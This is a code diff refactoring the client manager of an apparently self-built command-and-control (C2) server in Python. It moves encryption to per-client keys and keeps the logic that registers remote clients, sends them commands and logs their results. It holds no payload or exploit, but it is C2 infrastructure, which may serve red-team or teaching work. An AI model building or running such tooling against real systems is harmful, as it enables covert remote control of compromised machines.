@@ -1,6 +1,6 @@
 """
 Client Manager for C2 Server
-Handles all client-related operations following SOLID principles
+Handles client lifecycle management following SOLID principles
 """
 
 import asyncio
@@ -18,11 +18,10 @@ logger = logging.getLogger(__name__)
 
 
 class ClientManager:
-    """Manages all client connections and operations"""
+    """Manages client lifecycle - registration, communication, cleanup"""
     
-    def __init__(self, encryption_manager):
+    def __init__(self):
         self.clients: Dict[str, ClientState] = {}
-        self._encryption_manager = encryption_manager
         self._shutdown_event = asyncio.Event()
     
     def set_shutdown_event(self, event: asyncio.Event):
@@ -43,16 +42,15 @@ class ClientManager:
             client_id = msg.client_id
             client_state = ClientState(client_id, reader, writer)
             
-            # Handle encryption setup
-            self._encryption_manager.compute_session_key(msg.command)
-            logger.info(f"Shared key: {self._encryption_manager.session_key}")
+            # Setup client-specific encryption
+            server_public_key = client_state.setup_encryption(msg.command)
+            logger.info(f"Encryption setup for client: {client_id}")
             
             self.clients[client_id] = client_state
             logger.info(f"Client registered: {client_id}")
             
-            # Send acknowledgment
-            serialized_public_key = self._encryption_manager.serialized_public_key
-            await send_message(writer, Message.as_ack(client_id, serialized_public_key).to_payload(True))
+            # Send acknowledgment with server's public key
+            await send_message(writer, Message.as_ack(client_id, server_public_key).to_payload(True))
             
             return client_state
             
@@ -123,7 +121,11 @@ class ClientManager:
                     logger.info('shutdown detected from receiver')
                     break
                 
-                msg = self._encryption_manager.decrypt(msg)
+                msg = client_state.decrypt_message(msg)
+                
+                if not msg:
+                    logger.warning("Failed to decrypt message")
+                    break
                 
                 if msg.type is MessageType.RESULT:
                     logger.info(f"Result from {client_state.client_id}: {msg.result[:100]}")
@@ -164,7 +166,7 @@ class ClientManager:
                 
                 client_state.pending_results[cmd_id] = command
                 msg = Message.as_command(cmd_id, command)
-                msg = self._encryption_manager.encrypt(msg)
+                msg = client_state.encrypt_message(msg)
                 
                 await send_message(client_state.writer, msg)
                 logger.info(f"Command sent to {client_state.client_id}: {command}")
